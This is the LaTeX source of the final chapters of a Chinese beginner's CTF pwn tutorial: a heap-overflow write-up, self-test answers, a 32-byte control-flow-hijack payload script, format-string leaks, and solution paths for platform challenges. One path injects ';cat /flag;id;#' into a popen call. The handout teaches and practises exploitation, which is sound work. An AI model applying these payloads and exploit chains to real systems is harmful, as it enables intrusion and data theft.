\paragraph{为什么会成功}一句话机制：\kw{长度检查用的是“旧上限”，而写的是“已收缩的真实缓冲区”}。展开说：\code{pack} 把缓冲区重新分配成更小的块（512 字节的块收缩到 0x20），但结构体里的 \code{cap} 仍是 520——于是 \code{edit} 的“合法”长度可以写到相邻 chunk 里。相邻的正是下一条笔记的\kw{结构体}（含 \code{cap}/\code{len}/\code{buf} 三个字段），改掉 \code{buf} 就等价于“让这条笔记指向任意地址”：\code{show} 变成任意读，\code{edit} 变成任意写。有了任意写，最后的取 flag 甚至不需要写 shellcode：全局结构里本来就有一个\kw{函数指针}，把它指向程序自带的“打印 flag 文件”函数即可——这就是“只借程序已有的能力”。另外，\code{delete} 之后的块被复用但不擦除，也让“回忆旧数据”（读出残留指针）成为定位堆布局的第一步。

\debugtip{
\begin{itemize}
\item 连接后被立刻断开、看不到 PoW：实例已到期或未启动，回题目页重开（付费题按 30 分钟计费）；
\item PoW 一直不过：确认 MD5 是对\kw{补全后的完整 token} 求的（不是只对缺的 4 个字母），且补的是\kw{大写}字母；
\item 溢出后服务无响应：说明写穿了 chunk 头（本轮实测 64 字节即崩）。做原语时要\kw{保留 16 字节 chunk 头不动}，只覆盖邻块结构体的字段；崩了也没关系——每连接是独立进程，重连即可；
\item 任意读返回空/乱码：\code{buf} 要指向\kw{可读}地址；先按泄漏出的堆地址附近试，再逐步扩大范围；
\item 算出的基址不是 \code{0x...000} 对齐或开头不是 \code{7f 45 4c 46}：\code{fn} 的偏移记错了，回 \code{show} 重新读 \code{arc->fn}；
\item 改完 \code{arc->fn} 没反应：\code{quit} 才会调用它；确认改的地址是 \code{base+0x1330} 而不是别的偏移。
\end{itemize}}

\paragraph{变式练习}
\begin{enumerate}
\item 把 \code{cap = max(reserve,16)+8} 这条规则用实验补齐：分别用 8、16、24、32、48 做 \code{reserve}，记录 \code{show} 回来的 \code{cap}，总结公式并解释那个 \code{+8} 是什么。
\item 用“\code{delete} 后 \code{create} 同尺寸笔记”的办法，把被释放块里的残留内容（旧数据、fd 指针）读出来，画一张“堆块生命周期”图，标出哪一步能读到什么。
\item 思考题：如果程序把 \code{pack} 之后的 \code{cap} 同步更新为真实大小，这条链还成立吗？为什么？（提示：本文的“任意读/写”完全建立在 cap 与真实尺寸脱钩之上。）
\item 思考题：为什么本题最终选择“改函数指针指向已有函数”，而不是“执行注入的 shellcode”？（提示：回看 2.9 节 NX 的作用点。）
\item 在你自己的机器上写一个同样有“cap 与真实尺寸脱钩”缺陷的小服务（C + malloc），复现出任意读，体会这类 bug 与 P1 的“越界写”在本质上的相同点。
\end{enumerate}

% ===========================================================================

% ===========================================================================

\chapter{复盘：知识地图与易错清单}
% ===========================================================================
\goal{把八道题串成一张“下次遇到这类题怎么办”的地图，并把最容易踩的坑列成清单。}

\section{解题流程图：拿到材料先做什么}
八道题的完整流程就是 \figref{pipeline-map} 里的八步。请对照自己做过一遍，默画出来：
\begin{enumerate}[label=\arabic*.]
\item \kw{分诊}：\code{file} 看架构与类型（EXEC 还是 PIE）；能连的服务先 \code{help}/\code{ls} 看菜单；
\item \kw{读材料}：有源码就读源码（找数组、函数指针、\code{read} 长度、\code{printf} 写法）；没源码就 \code{objdump} 找调用点；
\item \kw{建基线}：跑一遍正常输入，把标准输出（如 \code{Try again.}）记下来；
\item \kw{测布局}：用 \code{offsetof} 小程序或反汇编确认字段偏移（\code{next} 在 24）；本机结构体大小为 32 字节；
\item \kw{取地址}：\code{nm} 读当前产物的目标函数地址（如 \code{win=0x401190}），或在线题用 \code{check x} 泄漏地址；
\item \kw{造字节}：\code{struct.pack('<Q', addr)} 生成小端地址，检查长度与 \code{hex}；
\item \kw{送入并观察}：文件重定向或脚本把二进制送进去，先看现象，再看 flag；
\item \kw{核对答案}：对源码、重算、平台反馈三者至少核对一样；脚本打印 flag 只是第一步。
\end{enumerate}
再回到 2.9 节那张表：每条保护卡在哪一步，决定了你第 5、6、7 步要不要换打法。

\section{下次遇到这类题怎么办}
\begin{longtable}{p{0.32\linewidth}p{0.58\linewidth}}
\toprule
题型信号 & 固定动作 \\
\midrule
给源码，数组后面紧跟别的字段 & \code{offsetof} 实测偏移 $\to$ 算出“多写几字节能盖到哪个字段” $\to$ 再看那字段是函数指针还是普通数据。 \\
给二进制，有 \code{win} 之类函数 & \code{nm} 读它的地址（当前产物）$\to$ \code{objdump} 确认调用点 $\to$ \code{struct.pack('<Q', ...)} 打包。 \\
要往字段里写地址 & 三问：小端还是大端？几个字节？高位零补齐没有？用 \code{unpack} 反向核对。 \\
看到 \code{printf(input, ...)} & 立刻判断“谁控制格式串”：用户控制就是漏洞；先用 \code{strings} 找常量，再决定用 \code{\%s} 还是数 \code{\%p}。 \\
在线服务有 \code{debug <fmt>} & 先 \code{check x} 之类的命令泄漏一个基址，再用一串 \code{\%p} 数参数位置，最后 \code{\%s} 读目标地址。 \\
同一源码两个产物 & \code{file}/\code{readelf}/\code{objdump} 逐条列保护，把每条保护对应到它卡住的那一步。 \\
结果拿不准是不是 flag & 按四条查：前缀 \code{flag\{}、字符范围、花括号配对、独立再验证。 \\
\bottomrule
\end{longtable}

\section{易错清单（按“错一下浪费半小时”的顺序）}
\begin{enumerate}
\item \kw{把地址写成文本}：\code{0x401190} 是给人看的写法，字段要 8 个原始字节。用 \code{struct.pack}，不要手敲字符。
\item \kw{payload 长度不对}：P1 要求恰好 32（理由见 P1 第 6 步的长度实验）——少一字节时指针高位保留旧值，可能碰巧成功；多一字节会写到 \code{next} 之外。先用 \code{wc -c} 核对长度。
\item \kw{抄了别人的地址}：地址属于当前编译产物，换机器/换参数就变。永远在\kw{当前产物}上 \code{nm} 重读。
\item \kw{字节序或宽度搞错}：\code{'<I'}（4 字节）不能拿来装 64 位地址；要 \code{'<Q'}。
\item \kw{忘了高位零字节}：\code{0x401190} 是 \code{90 11 40 00 00 00 00 00}，末尾的 \code{00} 一个都不能少。
\item \kw{把“越界”直接当成“能拿 flag”}：多写的字节要落到函数指针之类能改控制流的字段上才有用。
\item \kw{格式串用错说明}：\code{\%p} 只打印指针值，\code{\%s} 会解引用读字符串；用错轻则读错、重则崩溃。
\item \kw{以为 \code{\%1\$s} 到处能用}：位置参数只在本地 demo 的已知布局里成立；真实题要先数参数位置。
\item \kw{把平台特定值当通用常数}：296 的 \code{137}、\code{200}、\code{0x40}、\code{0x0c}、\code{0x4c} 都是该附件特定值，换构建重测。
\item \kw{认证成功就以为完事}：296 还要 \code{write priv.list cat} 写标记并\kw{重连}让新会话重读，否则 \code{cat flag} 仍被拒。
\item \kw{用了过期实例地址}：在线题的 HOST/PORT 会过期，每次复现都要从当前实例页面重读。
\item \kw{省略验证}：脚本打印 flag 不等于对；\code{offsetof} 实测、解包还原、修复版对照、平台反馈，至少做一类。
\end{enumerate}

\memory{分诊 → 读材料 → 建基线 → 测布局 → 取地址 → 造字节 → 送入观察 → 核对答案。八步都留下证据。}

% ===========================================================================
\chapter{自测与参考答案}
% ===========================================================================
\goal{先做自测题再看答案。答案里的推演刻意写全中间判断，直接抄最后一行是自欺。}

\section{课后自测题}
\begin{enumerate}
\item 用一句话说清 Pwn 与 Crypto 在“破什么”上的区别。
\item 进程内存大致分哪几块？局部变量和函数指针通常住在哪一块？
\item x86-64 里第 1、第 2 个函数参数分别放在哪个寄存器？
\item \code{struct Session \{ char name[24]; void (*next)(void); \}} 在 64 位下的 \code{sizeof} 与 \code{offsetof(next)} 各是多少？怎么独立确认？
\item \code{read(0, session.name, sizeof session)} 里，为什么第三个参数是 32 而不是 24？这个“多写的 8 字节”造成了什么后果？
\item 地址 \code{0x401190} 在 x86-64 小端内存里的 8 个字节是什么？为什么末尾的零字节不能省？
\item P1 的 payload 为什么恰好是 32 字节？31 字节或 33 字节分别会发生什么？
\item \code{printf("\%s", input)} 与 \code{printf(input, secret)} 的关键差别是什么？后者的修复写法怎么写？
\item \code{\%p} 与 \code{\%s} 在格式串里的作用有什么不同？为什么乱用 \code{\%s} 容易让程序崩溃？
\item PIE、Canary、NX、RELRO 各卡在利用链的哪一步？
\item 玄机 296 的利用链有哪四步？为什么认证成功后还要重连才能 \code{cat flag}？
\item 296 的 \code{137}、\code{200}、\code{0x40} 为什么不能当通用常数？
\end{enumerate}

\section{参考答案与完整推演}

\paragraph{第 1 题}Crypto 破的是\kw{数学关系}（密钥空间、模运算、参数复用），目标是还原数据；Pwn 破的是\kw{程序的执行过程}（内存布局、控制流、参数传递），目标是让运行中的程序做出未预期的行为。

\paragraph{第 2 题}大致分为代码段（.text，只读可执行，放机器码）、数据段（.data/.bss，放全局变量与字符串常量）、堆（heap，向上增长，放动态申请的内存）、栈（stack，向下增长，放局部变量、参数、返回地址）。局部变量与函数指针通常住在\kw{栈}上。

\paragraph{第 3 题}第 1 个参数在 \code{rdi}，第 2 个在 \code{rsi}，第 3 个在 \code{rdx}。

\paragraph{第 4 题}\code{sizeof(struct Session)} = 32，\code{offsetof(next)} = 24（\kw{本机实测，换构建重测}）。独立确认有两个办法：写一个用 \code{offsetof} 的小程序直接问编译器（\code{layout.c}）；或 \code{objdump -d} 看 \code{read} 的目标 \code{-0x20(\%rbp)} 与指针 \code{-0x8(\%rbp)} 相差 \code{0x18}=24。

\paragraph{第 5 题}\code{sizeof session} 是整个结构体的大小 32（24 字节数组 + 8 字节指针），不是数组的 24。后果是：\code{read} 从 \code{name} 起连续写 32 字节，前 24 字节填满 \code{name}，\kw{多出的 8 字节正好完整覆盖函数指针 \code{next}}，从而把控制流改成我们指定的地址。

\paragraph{第 6 题}小端 8 字节是 \code{90 11 40 00 00 00 00 00}（十六进制串 \code{9011400000000000}）。末尾零字节不能省，因为指针宽度固定为 8 字节，少写零会让后续字段错位、读出的地址也不对。\code{struct.pack('<Q', 0x401190)} 一次做对小端、宽度和零填充三件事。

\paragraph{第 7 题}因为结构体大小是 32：偏移 0--23 是 \code{name} 的填充，偏移 24--31 是 \code{next} 的 8 字节地址，合计 32。31 字节时第 8 个地址字节没写上，指针高位保留旧值——本次实测\kw{仍然打印了 flag}，因为 \code{normal} 与 \code{win} 的地址只有最低字节不同（\code{0x401176} 与 \code{0x401190}），高位本来就是 \code{00}；33 字节时多出的那个字节越过 \code{next}，落到栈上保存的 \code{rbp} 低字节，本次也\kw{恰好没有可见后果}。所以正确答案不是“31/33 一定失败”，而是：\kw{只有写满 8 字节，才保证写出的地址正是你想要的}——换成最高位非零的地址（例如 PIE 程序的 \code{0x7f...}），31 字节立刻失败；多写的字节一旦落到关键位置，33 字节也会崩。\figref{length-experiment} 是这三个长度的真实现象，\figref{pie-blocked} 则演示了换构建后同一条 payload 直接段错误。

\paragraph{第 8 题}关键差别在\kw{谁控制格式串}：\code{printf("\%s", input)} 的格式串是程序写死的常量，用户输入只进参数位置，\code{\%s} 只把输入当文本打印；\code{printf(input, secret)} 把用户输入当格式串，于是用户能用 \code{\%s} 去读一个参数当字符串地址。修复写法：\code{printf("\%s", input);} 或 \code{fputs(input, stdout);}，即格式串永远由程序固定。

\paragraph{第 9 题}\code{\%p} 把对应参数当成\kw{指针值}直接打印（一个十六进制数，不解引用）；\code{\%s} 把对应参数当成\kw{字符串地址}，去读它指向的内存直到遇 \code{\textbackslash 0}。因为 \code{\%s} 会解引用，若那个位置不是合法字符串地址（栈上随机值很常见），进程会因读非法地址而崩溃。

\paragraph{第 10 题}PIE/ASLR 卡\kw{取地址}那一步（地址每次变）；Canary 卡\kw{覆盖}那一步（越界写在返回前被检测）；NX 卡“\kw{执行新代码}”（栈上机器码不可执行）；RELRO/只读 GOT 卡“\kw{改函数地址表}”（改 GOT 那类思路）。

\paragraph{第 11 题}四步链：\kw{泄漏}（\code{check x} 拿到消息地址 $m$，算出随机口令地址 $m+0x40$，再用 \code{debug <格式串>} 读出口令）→ \kw{认证}（\code{auth <口令>}）→ \kw{持久化}（\code{write priv.list cat} 把 \code{cat} 标记写进 \code{/tmp/priv.list}）→ \kw{重连读取}（新会话初始化时重新读取该标记，再 \code{cat flag}）。因为服务是在\kw{新连接初始化时}才读标记，当前会话即使写了标记也还没重新加载，所以必须关闭并重连。

\paragraph{第 12 题}它们都是\kw{该附件特定值}：\code{0x0c}、\code{0x4c} 是这一份二进制里消息缓冲区与随机口令的结构体偏移（相差 \code{0x40}），\code{137}、\code{200} 是这份构建下的栈参数序号。换编译器、换编译参数或平台更换服务端产物，这些值都会变。正确做法是用 \code{debug \%p} 重新数参数、重新用反汇编核对结构体偏移，绝不能当通用常数。

\section{完整推演：P1 的 32 个字节从哪来}
P1 的名字数组占 24 字节，紧接着是一个 8 字节函数指针，所以结构体总大小 $24+8=32$。程序用 \code{read(0, session.name, sizeof session)} 从 \code{name} 起点连续写 32 字节：偏移 0--23 填满名字，偏移 24--31 盖住 \code{next}。用 \code{nm overflow | grep win} 读当前产物里 \code{win} 的地址（本机是 \code{0x401190}），用 \code{struct.pack('<Q', win)} 打成小端 8 字节。最终 payload $=\underbrace{b'A' \times 24}_{24\ \text{填充}}+\underbrace{struct.pack('<Q', win)}_{8\ \text{地址}}$，长度 $24+8=32$。

\begin{lstlisting}[language=Python]
import struct
win = 0x401190                 # from: nm overflow | grep win  (this build only!)
payload = b"A" * 24 + struct.pack("<Q", win)
assert len(payload) == 32, len(payload)
open("payload.bin", "wb").write(payload)
print(len(payload), payload[-8:].hex())    # 32 9011400000000000
\end{lstlisting}
\kw{如何独立核对}：打印 \code{len(payload)} 必须等于 32；打印 \code{payload[-8:].hex()} 必须是 \code{9011400000000000}（与 \code{nm} 读到的地址一致）；跑正常输入仍应得到 \code{Try again.}，说明行为由输入决定，而不是程序坏了。若仍调用 \code{normal}，多半没写满 32 字节；若崩溃，多半地址字节错（写成文本、字节序错或宽度错）。这个实验的重点是从内存布局解释现象，不是背下一组对所有机器都适用的地址。

\paragraph{答案}\code{flag\{control\_flow\_redirected\}}（本地程序真实输出）。

\section{完整推演：P3 的 \code{\%s} 为什么能读到秘密}
\code{format.c} 把 \code{secret} 指针传为 \code{printf} 的第一个可变参数，同时允许用户控制格式串。x86-64 的调用约定把第 2 个参数放在 \code{rsi}，而 \code{printf(input, secret)} 中 \code{secret} 正是第 2 个参数。当你输入 \code{\%s}，printf 按 \code{\%s} 的规则“取一个参数当字符串地址、打印它指向的内容”，取到的就是 \code{secret}。因此输出 \code{flag\{format\_string\_leaks\}}。核对方式：\code{strings format | grep flag} 显示二进制里确有该常量；把源码改成 \code{printf("\%s", input)} 后，同样的输入只会打印字面 \code{\%s}。

\paragraph{答案}\code{flag\{format\_string\_leaks\}}（本地程序真实输出）。

\section{已复核真题：pwn-ezpwn（296）}
题目把 \code{debug} 参数当作 \code{dprintf} 的格式串。\code{check x} 会打印消息缓冲区地址；这份二进制中随机口令位于消息地址加 \code{0x40}（\kw{该附件特定值、换构建重测}）。按该产物栈布局，把口令指针放到第 200 个格式参数位置的栈缓冲里即可用 \code{\%s} 读出口令（命令缓冲区从第 137 个参数起，\kw{该附件特定值、换构建重测}）；格式串后用 NUL 结束格式文本，NUL 之后的指针字节仍留在栈缓冲里供 \code{\%s} 使用。\code{auth} 成功后 \code{write priv.list cat} 写入权限标记，再\kw{重连}让新会话重新读取标记，执行 \code{cat flag} 得到：

\flagbox{flag\{FF3228AB-FBB1-4296-800C-7C6C0ECE8FB7\}}

复核结论：\kw{2026-09-25 在玄机平台提交后显示“FLAG 正确”、步骤 1/1}；复现必须在\kw{已授权的在线实例}里运行 \code{python3 labs/platform/solve\_pwn\_ezpwn.py HOST PORT}，HOST/PORT 从题目当前实例页面读取，不可使用过期地址。若平台更换编译产物，须重新核对 \code{137}、\code{200}、\code{0x40}、\code{0x0c}、\code{0x4c}，不可当通用常数。

% ===========================================================================
\chapter*{附录 A：玄机平台真题状态与提交 checklist}
\addcontentsline{toc}{chapter}{附录 A：玄机平台真题状态与提交 checklist}
% ===========================================================================
本册共 8 道题。P0--P4 是资料自带的本地靶场，断网就能做，flag 由程序自己打印；296、167、514 是玄机平台真题，必须连着平台的在线实例（其中 514 为付费题，5 金币/30 分钟）。平台题的状态照实记录，绝不编造。

\begin{longtable}{p{0.18\linewidth}p{0.26\linewidth}p{0.46\linewidth}}
\toprule
题号与名称 & 本地材料 & 状态（照实记录，绝不编造） \\
\midrule
296 pwn-ezpwn & 原始附件 ZIP、远程交互脚本 \url{labs/platform/solve_pwn_ezpwn.py} & 可离线检查附件与脚本；读取服务端 flag 须连接当前实例。运行脚本并提供当前 HOST/PORT 后，可写入权限标记并重连取 flag。2026-09-25 提交成功，页面显示 FLAG 正确、步骤 1/1。 \\
167 CISCN mqtt & 套件（\code{pwn}、\code{libc}、\code{ld}、\code{libcjson}、MQTT 库）与 \code{solve\_mqtt.py}：\textbf{均不随讲义分发}，须自行从题目页下载 & 免费题。先用本地假 broker 调通，再连平台实例；利用 \code{set\_vin} 的 TOCTOU 注入。2026-09-26 提交成功，页面显示“已完成”，完成人数 11→12。 \\
514 Ancient-Recall & 无附件（平台只给在线实例）、复现脚本 \code{platform/\allowbreak solve\_514.py}（练习目录，不随讲义分发） & 付费题（5 金币/30 分钟）。流程：过 PoW 网关 $\rightarrow$ 量菜单协议 $\rightarrow$ \code{pack} 后 \code{cap} 与真实缓冲脱钩形成堆溢出 $\rightarrow$ 改邻块结构体的 \code{buf} 得到任意读/写 $\rightarrow$ 覆写全局函数指针指向“打印 flag 文件”的函数。\textbf{2026-09-26 已在平台提交，页面显示“已完成”，题目完成人数由 2 人变为 3 人}。 \\
\bottomrule
\end{longtable}

说明：平台题面、价格与界面都可能变化，始终以当前题目详情页为准；本讲义不保存账号口令，也不把附件打包分发。提交后必须亲眼看到页面显示“FLAG 正确”及步骤完成，才能把答案标记为“已验证”。未验证的推测不得写成答案。296 的 \code{137}、\code{200}、\code{0x40}、\code{0x0c}、\code{0x4c} 都是\textbf{该附件特定值}：一旦平台更换编译产物，必须重新测，不能当通用常数套用。

\section*{296 的复现路径}
\begin{enumerate}[label=\arabic*.]
\item 在题目详情页启动（或在有效期内复用）\kw{在线实例}，从页面读取当前的 \code{HOST} 和 \code{PORT}。
\item 在 \kw{WSL} 里进资料根目录，运行求解脚本：
\begin{lstlisting}
cd /mnt/c/Users/你的用户名/Desktop/CTF零基础自学资料包
python3 labs/platform/solve_pwn_ezpwn.py HOST PORT
\end{lstlisting}
\item 脚本会依次完成：\code{check x} 泄漏消息缓冲区地址 $m$ $\rightarrow$ 用 $m+0x40$ 定位口令 $\rightarrow$ \code{debug <格式串>} 泄漏口令 $\rightarrow$ \code{auth <口令>} 认证 $\rightarrow$ \code{write priv.list cat} 写入权限标记 $\rightarrow$ \kw{重连}让新会话重新读取标记 $\rightarrow$ \code{cat flag}。
\item 终端打印出 \code{flag\{...\}} 后，回到平台粘贴提交，确认页面反馈。
\end{enumerate}

\section*{167 的复现路径}
\begin{enumerate}[label=\arabic*.]
\item 在题目页点\kw{“启动环境”}（免费），从页面读出当前的 \code{HOST} 与 \code{PORT}（本次为 \code{env.xj.edisec.net:30953}，实例关闭即失效）。
\item 在 \kw{WSL} 里进练习目录运行求解脚本（脚本与附件在 \code{\textasciitilde/pwn-lab/platform/}，不随讲义分发）：
\begin{lstlisting}
cd ~/pwn-lab/platform && timeout 100 python3 solve_mqtt.py HOST PORT
\end{lstlisting}
\item 脚本以 MQTT 客户端接入该 broker：订阅 \code{diag} 与 \code{diag/resp} $\rightarrow$ 从目标广播里取 VIN $\rightarrow$ 算 token（\code{h=h*31+c} 的 \code{\%08x}）$\rightarrow$ 发合法 \code{set\_vin} 进入 2 秒窗口 $\rightarrow$ 窗口内反复发 \code{unknown\_command} 覆写全局 \code{arg} $\rightarrow$ 目标 \code{popen} 执行 \code{;cat /flag;id;\#}，回显被 publish 到 \code{diag/resp}。
\item 终端出现 \code{FLAG\{...\}} 后回平台提交，确认页面显示“已完成”。
\end{enumerate}

\section*{平台上其它 Pwn 题的状态（照实记录）}
本次调研（2026-09-26）时平台 PWN 分类共 5 题：296、167、514 已收入本册并完成提交验证；剩余两题\kw{暂未收入}，原因如实列出：

\begin{longtable}{p{0.26\linewidth}p{0.36\linewidth}p{0.28\linewidth}}
\toprule
题目 & 现状 & 处理 \\
\midrule
271 2025安徽·abs & 免费；附件只有 \code{abs.c} 与 \code{libc-2.27.so}，没有可执行体、也没有在线实例 & 未收入：无法离线取得 flag（题面缺失、无复现目标） \\
270 2025安徽·KROP2 & 免费；附件只有一个二进制 \code{ROP2}（EXEC、NX、Partial RELRO），没有 libc、没有在线实例 & 未收入：同上，缺少可验证 flag 的复现路径 \\
\bottomrule
\end{longtable}

以上现状可能变化（平台后续补齐附件或实例）；若补齐，可按 167 的同一套流程复核后再补进本册。\kw{没有验证过的题不写进讲义}——这是本册的红线。

\section*{提交 checklist}
\begin{enumerate}[label=\arabic*.]
\item 题目与链接是否记清：296 pwn-ezpwn \url{https://xj.edisec.net/challenges/296}；167 mqtt \url{https://xj.edisec.net/challenges/167}；附件是否为当前官方版本，脚本路径是否为 \url{labs/platform/solve_pwn_ezpwn.py} 与 \url{~/pwn-lab/platform/solve_mqtt.py}（不是个人下载目录里的旧副本）。
\item 实例信息是否最新：\code{HOST}、\code{PORT} 是否从\kw{当前}实例页面读取；实例是否仍在有效期内（过期地址会直接连接超时）。
\item 脚本前提是否核对：脚本开头的 \code{STACK\_ARG\_FOR\_INPUT = 137}、\code{TARGET\_ARG = 200}、口令相对消息地址的偏移 \code{0x40}，以及二进制里两字段偏移 \code{0x0c}/\code{0x4c}，是否与\kw{当前}产物一致；不一致时先按 4.6 节的办法重新数参数、重新核对偏移。
\item 利用链是否完整：泄漏 $\rightarrow$ 认证 $\rightarrow$ 写权限标记 $\rightarrow$ \kw{重连} $\rightarrow$ \code{cat flag}，五步缺一不可。没有重连就没有“新会话重新读标记”，自然看不到 flag。
\item 本地两题是否独立复现：P1 必须亲手跑出 \code{flag\{control\_flow\_redirected\}}，P3 必须亲手跑出 \code{flag\{format\_string\_leaks\}}；并各留一条\textbf{独立证据}（\code{nm} 读到的地址、\code{strings} 搜到的常量）。
\item 平台反馈是否记录：提交后页面显示“FLAG 正确”及步骤完成；未验证的推测不写成答案，带做记录里保留“已完成到哪一步、还差哪一步”。
\item 安全边界是否守住：只在资料自带的 \code{labs/} 与明确授权的 CTF 平台实例上操作；不把命令用于未授权的系统；不给同学转发账号口令，只给链接与运行命令。
\end{enumerate}

% ===========================================================================
\chapter*{附录 B：命令速查表}
\addcontentsline{toc}{chapter}{附录 B：命令速查表}
% ===========================================================================
两列表：左列“想做什么”，右列“敲什么命令”。\kw{默认在 WSL 的练习目录 \code{\textasciitilde/pwn-lab} 下执行}；标注 PowerShell 的在 Windows 里敲。命令里凡出现当前产物特有的地址，都注明“本机实测、换构建重测”。

\begin{longtable}{p{0.4\linewidth}p{0.54\linewidth}}
\toprule
想做什么 & 敲什么命令 \\
\midrule
进资料根目录（PowerShell） & \code{cd C:	extbackslash{}Users	extbackslash{}你的用户名	extbackslash{}Desktop	extbackslash{}CTF零基础自学资料包} \\
WSL 里进资料目录 & \code{cd /mnt/c/Users/你的用户名/Desktop/CTF零基础自学资料包} \\
WSL 里进练习目录 & \code{cd \textasciitilde/pwn-lab} \\
确认当前目录 & WSL：\code{pwd}；PowerShell：\code{Get-Location} \\
看编译器版本 & \code{gcc --version} \\
看 Python 版本 & \code{python3 --version} \\
确认是 64 位 & \code{uname -m} \\
从资料里复制源码 & \code{cp} \url{/mnt/c/Users/你的用户名/Desktop/CTF零基础自学资料包/labs/pwn/*.c} \url{~/pwn-lab/} \\
编译教学版（无 PIE、无 Canary） & \code{gcc -O0 -fno-stack-protector -no-pie -o overflow overflow.c} \\
编译格式串题 & \code{gcc -O0 -o format format.c} \\
编译一个 PIE 版做对照 & \code{gcc -O0 -o overflow-pie overflow.c} \\
认文件类型 & \code{file overflow format payload.bin} \\
看 ELF 头 & \code{readelf -h overflow | head -14} \\
看入口点 & \code{LANG=C readelf -h overflow | grep Entry} \\
看栈是否可执行 & \code{LANG=C readelf -l overflow | grep GNU\_STACK} \\
查符号地址 & \code{nm overflow | grep -E 'win|normal'} \\
反汇编程序主体 & \code{objdump -d overflow | tail -32} \\
查 Canary 是否启用 & \code{objdump -d overflow-pie | grep stack\_chk | head -4} \\
在二进制里搜 flag 常量 & \code{strings format | grep flag} \\
看文件头十六进制 & \code{xxd -l 32 overflow} \\
看结构体布局实测值 & \code{./layout}（用自己写的 \code{layout.c} 打印 \code{sizeof}/\code{offsetof}） \\
打包小端 8 字节地址 & \code{struct.pack('<Q', 0x401190)} \\
看原始字节列表 & \code{list(struct.pack('<Q', 0x401190))} \\
生成 payload & \code{python3 make\_payload.py} \\
看 payload 内容 & \code{xxd payload.bin} \\
用管道喂输入 & \code{echo alice | ./overflow} \\
用文件重定向喂输入 & \code{./overflow < payload.bin} \\
跑格式串题 & \code{echo '\%s' | ./format} \\
手动数格式参数 & \code{echo '\%p \%p \%p \%p' | ./format} \\
看平台脚本用法 & \code{head -12 labs/platform/solve\_pwn\_ezpwn.py} \\
跑平台题（需在线实例） & \code{python3 labs/platform/solve\_pwn\_ezpwn.py HOST PORT} \\
\bottomrule
\end{longtable}

% ===========================================================================
\chapter*{附录 C：术语表}
\addcontentsline{toc}{chapter}{附录 C：术语表}
% ===========================================================================
按拼音排序，每个术语一句话解释；更细的展开见对应章节。

\begin{longtable}{p{0.26\linewidth}p{0.66\linewidth}}
\toprule
术语 & 一句话解释 \\
\midrule
ASLR & 地址空间布局随机化：每次运行让栈、堆、库甚至程序自身的地址都变一变。 \\
Canary & 栈保护：在关键地址前埋一个随机“金丝雀”，函数返回前检查它有没有被改。 \\
ELF & Linux 可执行文件的格式，文件开头四字节是 \code{7f 45 4c 46}。 \\
flag & CTF 题的答案，通常形如 \code{flag\{...\}}，注意大小写与花括号。 \\
GOT/PLT & 程序调用外部函数时用来查真实地址的表；RELRO 会把它在启动后变只读。 \\
NX & 把栈标记为不可执行，于是往栈里写的机器码不能当代码跑。 \\
payload & 构造好、专门用来喂给程序的输入数据（本册指那 32 字节）。 \\
PIE & 位置无关可执行文件，配合 ASLR 让程序代码地址也随机，从而取不到固定地址。 \\
RELRO & 启动后把 GOT 一类地址表设为只读，防止被改写。 \\
参数序号 & 格式串里 \code{\%n\$p} 读的第 $n$ 个位置；先用一串 \code{\%p} 数出来。 \\
大端序/小端序 & 多字节数据的存放顺序；x86-64 用小端，低位字节在低地址。 \\
反汇编 & 把机器码翻译回汇编指令，\code{objdump -d} 做的就是这个。 \\
返回地址 & 函数执行完后要跳回去继续执行的地址，就在栈帧里。 \\
符号表 & 名字到地址的对照表，由 \code{nm} 读出，例如 \code{win} 的地址。 \\
格式串漏洞 & 把用户输入当格式串用，用户就能用 \code{\%s}/\code{\%p} 读走内存内容。 \\
函数指针 & 值是函数地址的变量；改掉它的值，就等于改掉程序的下一步。 \\
结构体 & 把若干字段连续排在内存里的一段数据，字段位置用偏移描述。 \\
控制流 & 程序下一步执行哪条指令的顺序；被改写就叫“控制流被劫持”。 \\
偏移 & 从一段内存或结构体开头数起的距离，常用十六进制表示。 \\
入口点 & 程序开始执行的第一条指令地址，\code{readelf -h} 能看到。 \\
十六进制 & 用 \code{0}--\code{9}、\code{a}--\code{f} 表示字节的写法，两位一个字节。 \\
栈帧 & 一个函数在栈上占用的那块空间，局部变量和返回地址都在里面。 \\
栈溢出/越界写入 & 写入长度超过缓冲区，多出的字节覆盖了相邻数据。 \\
字节 & 计算机存储的基本单位，一个 0--255 的数。 \\
字节序 & 同“大端序/小端序”。 \\
\bottomrule
\end{longtable}

\paragraph{写在最后}做 Pwn 题的三个动作请练到成为习惯：\kw{量布局}（用 \code{offsetof}、\code{nm}、反汇编把“猜”变成“量”）、\kw{认边界}（先问“这个缓冲区多大、谁能写多少”）、\kw{独立验证}（构造完输入先用 \code{xxd} 核对字节，再用基线输入证明程序没被你弄坏）。刚上手时跌进 \code{Try again.} 一百次都很正常，真正长本事的是每次都能说清楚“崩在哪一步、我改的哪个字节没生效”。祝你解题顺利。

\end{document}
